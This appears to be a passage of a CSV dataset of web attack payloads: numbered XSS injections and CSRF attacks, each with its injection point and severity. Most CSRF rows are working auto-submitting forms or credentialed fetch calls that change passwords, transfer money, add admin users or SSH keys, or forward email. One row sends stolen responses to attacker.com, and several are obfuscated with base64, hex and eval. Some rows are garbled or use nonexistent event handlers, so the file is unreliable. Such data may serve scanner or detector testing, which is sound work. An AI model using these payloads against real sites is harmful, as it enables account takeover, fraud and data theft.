xss-056,Stored XSS using svg with onload and setTimeout,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",User input field,stored,high,,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,Reflected XSS using iframe with srcdoc and encoded script,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,Stored XSS using svg with animateTransform and onbegin event,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,Reflected XSS using script tag with Function constructor,"<script>Function('alert(""XSS59"")')()</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-061,Reflected XSS using SVG with feImage and onload event,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,Stored XSS using details tag with ontoggle event and script,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,Reflected XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS63"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,Stored XSS using audio tag with onerror event,"<audio src='x' onerror='alert(""XSS64"")'></audio>",User input field,stored,high,,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,Reflected XSS using iframe with srcdoc and onload event,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,Reflected XSS using input tag with oninvalid event,"<input oninvalid='alert(""XSS67"")' required>",URL parameter,reflected,high,,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,Stored XSS using iframe with allow attribute and srcdoc,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",User input field,stored,high,,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,Reflected XSS using svg with onfocusin event,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,Stored XSS using video tag with onpause event,"<video onpause='alert(""XSS70"")'></video>",User input field,stored,high,,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,Reflected XSS using svg with onmouseenter event,"<svg onmouseenter='alert(""XSS71"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,Stored XSS using form tag with oninput event,"<form oninput='alert(""XSS72"")'><input></form>",User input field,stored,high,,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,Reflected XSS using svg with onwheel event,"<svg onwheel='alert(""XSS73"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,Stored XSS using iframe with allowfullscreen attribute and onload event,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",User input field,stored,high,,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,Reflected XSS using svg with onanimationend event,"<svg onanimationend='alert(""XSS75"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,Stored XSS using audio tag with onplay event,"<audio onplay='alert(""XSS76"")'></audio>",User input field,stored,high,,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,Reflected XSS using svg with onscroll event,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,Stored XSS using iframe with seamless attribute and onload event,"<iframe seamless onload='alert(""XSS78"")'></iframe>",User input field,stored,high,,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,Reflected XSS using svg with oncut event,"<svg oncut='alert(""XSS79"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,Stored XSS using svg with oncopy event,"<svg oncopy='alert(""XSS80"")'></svg>",User input field,stored,high,,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,Reflected XSS using svg with onpaste event,"<svg onpaste='alert(""XSS81"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,Stored XSS using svg with onreset event,"<svg onreset='alert(""XSS82"")'></svg>",User input field,stored,high,,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,Reflected XSS using svg with onsearch event,"<svg onsearch='alert(""XSS83"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,Stored XSS using svg with onselect event,"<svg onselect='alert(""XSS84"")'></svg>",User input field,stored,high,,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,Reflected XSS using svg with onshow event,"<svg onshow='alert(""XSS85"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,Stored XSS using svg with ontoggle event,"<svg ontoggle='alert(""XSS86"")'></svg>",User input field,stored,high,,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,Reflected XSS using svg with ontransitionend event,"<svg ontransitionend='alert(""XSS87"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,Stored XSS using svg with onunload event,"<svg onunload='alert(""XSS88"")'></svg>",User input field,stored,high,,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,Reflected XSS using svg with onvolumechange event,"<svg onvolumechange='alert(""XSS89"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,Stored XSS using svg with onwaiting event,"<svg onwaiting='alert(""XSS90"")'></svg>",User input field,stored,high,,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,Reflected XSS using svg with onwheel event and CSS animation,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,Stored XSS using svg with onpointercancel event,"<svg onpointercancel='alert(""XSS92"")'></svg>",User input field,stored,high,,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,Reflected XSS using svg with onpointerout event,"<svg onpointerout='alert(""XSS93"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,Stored XSS using svg with onpointerover event,"<svg onpointerover='alert(""XSS94"")'></svg>",User input field,stored,high,,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,Reflected XSS using svg with onpointerup event,"<svg onpointerup='alert(""XSS95"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,Stored XSS using svg with onselectstart event,"<svg onselectstart='alert(""XSS96"")'></svg>",User input field,stored,high,,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,Reflected XSS using svg with onshow event and tabindex,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,Stored XSS using svg with onstalled event,"<svg onstalled='alert(""XSS98"")'></svg>",User input field,stored,high,,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,Reflected XSS using svg with onsubmit event,"<svg onsubmit='alert(""XSS99"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
csrf-001,CSRF using auto-submitting hidden form with POST method,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,high,,Embed this form in a malicious page to auto-submit password change.
csrf-002,CSRF using image tag with GET request,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,Malicious webpage,CSRF,medium,,Trigger account deletion via GET request.
csrf-003,CSRF using XMLHttpRequest with credentials,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",Malicious webpage,CSRF,high,,Perform unauthorized money transfer.
csrf-004,CSRF using fetch API with credentials,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",Malicious webpage,CSRF,high,,Change victim's email address.
csrf-005,CSRF using auto-submitting form with file upload,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,medium,,Upload malicious avatar file.
csrf-006,CSRF using meta refresh redirect with GET request,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,Subscribe victim to premium plan.
csrf-007,CSRF using script tag to load external script triggering action,<script src='https://attacker.com/csrf-trigger.js'></script>,Malicious webpage,CSRF,high,,Load external script that performs CSRF.
csrf-008,CSRF using iframe with auto-submitting form inside,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,Change user settings silently.
csrf-009,CSRF using SVG with embedded script and form submission,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,high,,Trigger delete API call.
csrf-010,CSRF using beacon API to send POST request,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",Malicious webpage,CSRF,medium,,Send data to target endpoint.
csrf-011,CSRF using form with onsubmit event to modify data,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,Modify data before submission.
csrf-012,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",Malicious webpage,CSRF,high,,Like a post on victim's behalf.
csrf-013,CSRF using form with hidden inputs and auto-submit,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Transfer money silently.
csrf-014,CSRF using fetch with POST and custom headers,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",Malicious webpage,CSRF,high,,Attempt to bypass CSRF token.
csrf-015,CSRF using form with enctype multipart/form-data,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Upload file without user consent.
csrf-016,CSRF using script with setTimeout to delay request,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",Malicious webpage,CSRF,high,,Delayed delete request.
csrf-017,CSRF using form with target iframe to hide submission,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Change settings silently.
csrf-018,CSRF using form with GET method and auto-submit,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Send friend request without user consent.
csrf-019,CSRF using meta refresh with POST form submission via JavaScript,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Subscribe victim to premium plan.
csrf-021,CSRF using stealth iframe with delayed form submission,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",Malicious webpage,CSRF,high,,
csrf-022,CSRF using fetch with chained promises to exfiltrate response,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",Malicious webpage,CSRF,critical,,
csrf-023,CSRF using form with multiple hidden inputs and auto-submit,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-024,CSRF using image with onload event triggering XMLHttpRequest,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",Malicious webpage,CSRF,high,,
csrf-025,CSRF using SVG with embedded script to submit form,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,critical,,
csrf-026,CSRF using beacon API with custom payload,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",Malicious webpage,CSRF,medium,,
csrf-027,CSRF using form with enctype multipart/form-data and auto-submit,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,
csrf-028,CSRF using iframe with srcdoc containing auto-submitting form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-029,CSRF using script with setTimeout to chain multiple requests,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",Malicious webpage,CSRF,high,,
csrf-030,CSRF using form with target iframe and hidden inputs,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-031,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",Malicious webpage,CSRF,high,,
csrf-032,CSRF using form with onsubmit event modifying data,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-033,CSRF using image with onerror event triggering fetch,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",Malicious webpage,CSRF,high,,
csrf-034,CSRF using meta refresh to redirect to GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,
csrf-035,CSRF using script to create and submit form dynamically,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,Malicious webpage,CSRF,critical,,
csrf-036,CSRF using fetch with JSON payload (if API accepts),"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",Malicious webpage,CSRF,high,,
csrf-037,CSRF using form with multiple steps and chained submissions,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",Malicious webpage,CSRF,high,,
csrf-038,CSRF using iframe with srcdoc and script to submit form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-039,"CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>",,Malicious webpage,CSRF,high,,
csrf-040,CSRF using form with hidden iframe and delayed submission,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",Malicious webpage,CSRF,high,,
csrf-041,CSRF using script to create image with onload triggering fetch,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",Malicious webpage,CSRF,high,,
csrf-042,CSRF using form with multiple hidden inputs and chained submission,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",Malicious webpage,CSRF,high,,
csrf-043,CSRF using fetch with custom headers and JSON body,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",Malicious webpage,CSRF,high,,
csrf-044,CSRF using form with onsubmit event to modify hidden input,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-045,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",Malicious webpage,CSRF,high,,
csrf-046,CSRF using meta refresh to redirect to sensitive GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,Malicious webpage,CSRF,medium,,
csrf-047,CSRF using script to dynamically create and submit form with delay,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",Malicious webpage,CSRF,critical,,
csrf-048,CSRF using fetch with JSON body and credentials,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",Malicious webpage,CSRF,high,,
csrf-049,CSRF using chained form submissions with timeouts,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",Malicious webpage,CSRF,high,,
csrf-051,CSRF to add admin user via hidden form,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,Admin panel user management,CSRF,critical,,
csrf-052,CSRF to change email notification settings,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Email service user settings,CSRF,medium,,
csrf-053,CSRF to reset 2FA via GET request,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,Security 2FA reset endpoint,CSRF,high,,
csrf-054,CSRF to subscribe victim to premium service,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,Streaming service subscription,CSRF,medium,,
csrf-055,CSRF to change victim's shipping address,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,E-commerce user profile,CSRF,high,,
csrf-056,CSRF to add attacker as friend,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Social media friend management,CSRF,medium,,
csrf-057,CSRF to post malicious comment,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Blog comment submission,CSRF,medium,,
csrf-058,CSRF to change victim's profile picture,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,Social media profile update,CSRF,medium,,
csrf-059,CSRF to initiate money transfer,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Online banking transfer,CSRF,critical,,
csrf-060,CSRF to disable security alerts,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Security settings,CSRF,high,,
csrf-061,CSRF to change victim's password,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,User account management,CSRF,critical,,
csrf-062,CSRF to add malicious webhook URL,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,Continuous Integration webhook settings,CSRF,high,,
csrf-063,CSRF to change victim's timezone,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,Calendar application settings,CSRF,low,,
csrf-064,CSRF to enable auto-forwarding of emails,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,Email forwarding settings,CSRF,high,,
csrf-065,CSRF to add malicious SSH key,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,Git hosting service SSH keys,CSRF,critical,,
csrf-066,CSRF to change victim's language preference,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,User interface settings,CSRF,low,,
csrf-067,CSRF to add victim to attacker's mailing list,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Newsletter subscription,CSRF,low,,
csrf-068,CSRF to post malicious tweet,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media posting,CSRF,medium,,
csrf-069,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,CSRF,medium,,
csrf-070,CSRF to change victim's default payment method,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway account settings,CSRF,high,,
csrf-071,CSRF to enable auto-approve on code reviews,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,Code review platform settings,CSRF,high,,
csrf-072,CSRF to add victim's device to attacker's monitoring,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,IoT device management,CSRF,high,,
csrf-073,CSRF to change victim's calendar event,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,Calendar event management,CSRF,medium,,
csrf-074,CSRF to add victim's IP to blacklist,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,Firewall management,CSRF,high,,
csrf-075,CSRF to change victim's DNS settings,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,DNS management,CSRF,high,,
csrf-076,CSRF to add victim to attacker's mailing list,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Mailing list subscription,CSRF,low,,
csrf-077,CSRF to change victim's profile bio,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media profile,CSRF,medium,,
csrf-078,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,CSRF,medium,,
csrf-079,CSRF to change victim's notification preferences,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,App notification settings,CSRF,medium,,
csrf-081,CSRF with base64 encoded form and dynamic decoding,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,Dynamic base64 decoded form submission,CSRF,high,,
csrf-082,CSRF with hex encoded script and eval,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,Hex encoded script with eval,CSRF,high,,
csrf-083,CSRF with dynamically created iframe and delayed form submission,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();<\/script>');d.close();</script>",Dynamic iframe with form,CSRF,high,,
csrf-084,CSRF with obfuscated string concatenation,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String concatenation obfuscation,CSRF,high,,
csrf-085,CSRF with event-triggered form submission on mouseover,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",User interaction triggered CSRF,CSRF,medium,,
csrf-086,CSRF with delayed execution using setTimeout and obfuscated function,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",Delayed form submission,CSRF,high,,
csrf-087,CSRF with encoded URI components and dynamic decoding,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Encoded element creation,CSRF,high,,
